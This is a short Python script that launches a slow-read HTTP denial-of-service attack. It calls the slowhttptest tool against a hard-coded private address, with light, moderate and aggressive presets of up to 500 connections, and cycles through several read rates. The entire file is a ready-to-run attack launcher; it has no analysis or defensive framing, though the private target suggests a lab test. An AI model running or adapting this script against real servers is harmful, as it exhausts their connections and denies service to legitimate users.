
import sys
import subprocess

TARGET_URL = "http://192.168.100.122"

def main():
	if len(sys.argv) != 2:
		print("Usage: python3 slowreadattacknew.py <category>")
		print("category: light | moderate | aggresive")
		sys.exit(1)
	category = sys.argv[1].lower()
	configs = {
		"light":    {"connection": 100, "rate": 10},
		"moderate": {"connection": 300, "rate": 30},
		"aggresive": {"connection": 500, "rate": 50},
	}
	readrates = ["10/5", "15/5", "32/5"]
	runtime = 60
	if category not in configs:
		print("Invalid category. Use: light | moderate | aggresive")
		sys.exit(1)
	connection = configs[category]["connection"]
	rate = configs[category]["rate"]
	for readrate in readrates:
		cmd = [
			"slowhttptest",
			"-c", str(connection),
			"-r", str(rate),
			"-X",
			"-t", "GET",
			"-u", TARGET_URL,
			"-w", "8",
			"-y", "16",
			"-z", readrate,
			"-l", str(runtime)
		]
		print(f"[INFO] Running: {' '.join(cmd)}")
		subprocess.run(cmd)

if __name__ == "__main__":
	main()